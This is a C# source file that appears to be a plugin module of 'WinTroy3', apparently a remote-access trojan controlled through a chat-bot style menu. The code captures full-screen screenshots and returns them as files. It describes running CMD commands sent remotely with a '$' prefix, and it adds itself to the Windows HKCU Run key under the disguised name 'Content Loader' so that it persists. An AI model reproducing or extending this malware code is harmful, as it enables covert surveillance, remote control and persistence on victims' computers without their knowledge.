using Microsoft.Win32;
using System;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Security.Permissions;
using System.Windows.Forms;
using WinTroy3_PluginLib;
using Control = WinTroy3_PluginLib.Control;

public class Misc
{
    public static Respond ShowMiscMenu()
    {
        return new Respond
        {
            RespondTitle = "Misc",
            RespondText = "Miscellaneous options",
            RespondButtons = new string[]
            {
                "screenshot",
                "discordmenu",
                "cmdinfo",
                "toggleautostart",
                "ipinfo"
            }
        };
    }

    public static Respond ToggleAutostart()
    {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            true);
        var name = "Content Loader";
        var isNull = registryKey.GetValue(name) == null;
        if (isNull)
            registryKey.SetValue(name, Process.GetCurrentProcess().MainModule.FileName);
        else
            registryKey.DeleteValue(name, false);
        registryKey.Close();
        return new Respond
        {
            RespondText = $"Autostart is now {(isNull ? "enabled" : "disabled")}",
            RespondTitle = "Toggle Autostart"
        };
    }

    public static Respond CmdInfo()
    {
        return new Respond
        {
            RespondText = @"To run a CMD command you can just type the command with the `$` prefix.
Examples:
`$start explorer c:\users`
`$tasklist`",
            RespondTitle = "How to CMD"
        };
    }

    public static Respond Screenshot()
    {
        Bitmap screenshot = new Bitmap(SystemInformation.VirtualScreen.Width,
                               SystemInformation.VirtualScreen.Height,
                               PixelFormat.Format32bppArgb);
        Graphics screenGraph = Graphics.FromImage(screenshot);
        screenGraph.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                   SystemInformation.VirtualScreen.Y,
                                   0,
                                   0,
                                   SystemInformation.VirtualScreen.Size,
                                   CopyPixelOperation.SourceCopy);
        var filePath = $"{Config.PathConfig.GetTempPath()}{Control.GetRandomString()}.png";
        screenshot.Save(filePath, ImageFormat.Png);
        return new Respond
        {
            RespondTitle = "Screenshot",
            RespondFile = filePath,
            RespondText = "Screenshot recived"
        };
    }
}